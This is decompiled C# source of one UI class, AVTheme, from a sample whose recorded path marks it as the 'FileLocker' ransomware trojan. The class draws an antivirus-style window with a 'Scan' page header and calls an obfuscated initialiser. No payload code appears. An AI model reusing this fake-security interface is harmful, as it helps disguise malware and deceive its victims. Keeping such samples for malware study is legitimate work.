// Decompiled with JetBrains decompiler
// Type: FileLocker.AVTheme
// Assembly: FileLocker, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4E5EE51A-6914-4180-A10A-8B6B85AFF127
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Trojan-Ransom.Win32.Blocker.ibjo-459a487b0ad80fc56c06fca73eb80b3268bd423eaf6da5a1b400a7b5c19fb957.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace FileLocker
{
  public class AVTheme : ContainerControl
  {
    private static List<WeakReference> __ENCList;
    private Color C1;
    private Color C2;
    private SolidBrush B1;
    private SolidBrush B2;
    private Font F;
    private string T;
    private string _PageName;
    private Image _PageImage;
    private Point MouseP;
    private bool Cap;
    private int MoveHeight;

    [DebuggerNonUserCode]
    static AVTheme()
    {
      Class0.SLV0fFIsptsZtjvFft17();
      AVTheme.__ENCList = new List<WeakReference>();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object object_0)
    {
      lock (AVTheme.__ENCList)
      {
        if (AVTheme.__ENCList.Count == AVTheme.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (AVTheme.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (AVTheme.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                AVTheme.__ENCList[index1] = AVTheme.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          AVTheme.__ENCList.RemoveRange(index1, checked (AVTheme.__ENCList.Count - index1));
          AVTheme.__ENCList.Capacity = AVTheme.__ENCList.Count;
        }
        AVTheme.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
      }
    }

    public string PageName
    {
      get => this._PageName;
      set
      {
        this._PageName = value;
        this.Invalidate();
      }
    }

    public Image PageImage
    {
      get => this._PageImage;
      set => this._PageImage = value;
    }

    public AVTheme()
    {
      Class0.SLV0fFIsptsZtjvFft17();
      // ISSUE: explicit constructor call
      base.\u002Ector();
      AVTheme.__ENCAddToList((object) this);
      this.C1 = Color.FromArgb(242, 242, 242);
      this.C2 = Color.FromArgb(0, 166, 208);
      this.B1 = new SolidBrush(this.C1);
      this.B2 = new SolidBrush(this.C2);
      this._PageName = "Scan";
      this.MouseP = new Point(0, 0);
      this.Cap = false;
      this.MoveHeight = 48;
      this.BackColor = this.C1;
      this.DoubleBuffered = true;
      this.Dock = DockStyle.Fill;
      this.F = new Font("Segoe UI", 13f, FontStyle.Regular);
    }

    protected override void OnMouseDown(MouseEventArgs e)
    {
      base.OnMouseDown(e);
      if (!(e.Button == MouseButtons.Left & new Rectangle(0, 0, this.Width, this.MoveHeight).Contains(e.Location)))
        return;
      this.Cap = true;
      this.MouseP = e.Location;
    }

    protected override void OnMouseUp(MouseEventArgs e)
    {
      base.OnMouseUp(e);
      this.Cap = false;
    }

    protected override void OnMouseMove(MouseEventArgs e)
    {
      base.OnMouseMove(e);
      if (!this.Cap)
        return;
      this.Parent.Location = Control.MousePosition - (Size) this.MouseP;
    }

    protected override void OnPaint(PaintEventArgs e)
    {
      base.OnPaint(e);
      Graphics graphics1 = e.Graphics;
      graphics1.SmoothingMode = SmoothingMode.None;
      Image bitmap = (Image) this.ParentForm.Icon.ToBitmap();
      this.T = this.ParentForm.Text;
      graphics1.FillRectangle((Brush) this.B2, new Rectangle(0, 48, this.Width, 70));
      Graphics graphics2 = graphics1;
      Pen pen = new Pen((Brush) new SolidBrush(Color.FromArgb(203, 203, 203)));
      Point pt1 = new Point(0, checked (this.Height - 49));
      Point point1 = new Point(this.Width, checked (this.Height - 49));
      Point pt2 = point1;
      graphics2.DrawLine(pen, pt1, pt2);
      graphics1.DrawString(this.T, this.F, Brushes.Black, (float) ((double) this.Width / 2.0 - (double) graphics1.MeasureString(this.T, this.F).Width / 2.0), (float) (24.0 - (double) graphics1.MeasureString(this.T, this.F).Height / 2.0));
      Graphics graphics3 = graphics1;
      Image image = bitmap;
      point1 = new Point(checked ((int) Math.Round(unchecked ((double) this.Width / 2.0 - (double) graphics1.MeasureString(this.T, this.F).Width / 2.0 - (double) bitmap.Width - 2.0))), checked ((int) Math.Round(unchecked ((double) bitmap.Height / 2.0 - 7.0))));
      Point point2 = point1;
      graphics3.DrawImage(image, point2);
      if (this.ParentForm.FormBorderStyle != FormBorderStyle.None)
        this.ParentForm.FormBorderStyle = FormBorderStyle.None;
      graphics1.TextRenderingHint = TextRenderingHint.AntiAlias;
      graphics1.DrawString(this._PageName, new Font("Verdana", 17f, FontStyle.Regular), Brushes.White, 105f, 70f);
      if (this._PageImage == null)
        return;
      Graphics graphics4 = graphics1;
      Image pageImage = this._PageImage;
      point1 = new Point(70, checked ((int) Math.Round(unchecked (84.0 - (double) this._PageImage.Height / 2.0))));
      Point point3 = point1;
      graphics4.DrawImage(pageImage, point3);
    }
  }
}
